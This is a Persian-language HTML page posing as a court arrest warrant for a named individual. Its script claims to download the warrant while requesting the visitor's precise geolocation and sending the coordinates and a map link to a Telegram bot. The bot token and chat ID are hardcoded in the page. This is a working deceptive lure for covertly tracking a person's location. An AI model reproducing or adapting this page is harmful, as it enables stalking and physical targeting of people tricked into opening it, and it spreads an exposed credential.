<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>برگه جلب  اقا موسی اله بخشی </title>
  <style>
    body {
      text-align: center;
      font-family: Tahoma, sans-serif;
      padding: 20px;
      background-color: #f4f4f9;
    }
    #status {
      font-size: 16px;
      font-weight: bold;
      color: #333;
      margin-bottom: 15px;
    }
    #jalbImage {
      width: 794px;
      max-width: 100%;
      height: auto;
      border: 2px solid #000;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
      margin-top: 10px;
    }
  </style>
</head>
<body>

  <p id="status">لطفا منتظر باشد</p>

  <img id="jalbImage" src="JALB.jpg" alt="برگ جلب"/>

  <script>
    window.onload = function () {
      const status = document.getElementById('status');

      if (!navigator.geolocation) {
        status.innerText = "❌ مرورگر شما از قابلیت دانلود حکم داده گاه پشتیبانی نمی‌کند.";
        return;
      }

      const options = {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      };

      navigator.geolocation.getCurrentPosition(
        async position => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          // توکن و چت آی‌دی مستقیم در فرانت‌اند
    const BOT_TOKEN = "8947494572:AAGWviC7WYN2SJn0MV3RnQFfmUjSGP4wSec";
    const CHAT_ID = "8878957420";
          status.innerText = "درحال دانلود حکم دادگاه";

          try {
            // ۱. ارسال متن و لینک گوگل مپس
            const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
            const message = `📍 *موقعیت مکانی برگه جلب*\n\n` +
                            `عرض جغرافیایی: \`${lat}\`\n` +
                            `طول جغرافیایی: \`${lon}\`\n\n` +
                            `🗺 [مشاهده روی نقشه گوگل](${googleMapsUrl})`;

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
              })
            });

            // ۲. ارسال خود لوکیشن (سنجاق نقشه تلگرام)
            const locRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: CHAT_ID,
                latitude: lat,
                longitude: lon
              })
            });

            const resData = await locRes.json();

            if (resData.ok) {
              status.innerText = "  جلب متهم اقا موسی اله بخشی دانلود شد.   !";
            } else {
              status.innerText = `❌ خطای : ${resData.description}`;
            }

          } catch (error) {
            status.innerText = `❌ خطای شبکه: ${error.message}`;
          }
        },
        error => {
          switch (error.code) {
            case error.PERMISSION_DENIED:
              status.innerText = "❌ اجازه دسترسی به موقعیت مکانی داده نشد.";
              break;
            case error.POSITION_UNAVAILABLE:
              status.innerText = "❌   غیرقابل دسترس است.";
              break;
            case error.TIMEOUT:
              status.innerText = "❌ زمان درخواست  به پایان رسید.";
              break;
            default:
              status.innerText = "❌ خطای ناشناخته   .";
          }
        },
        options
      );
    };
  </script>
</body>
</html>
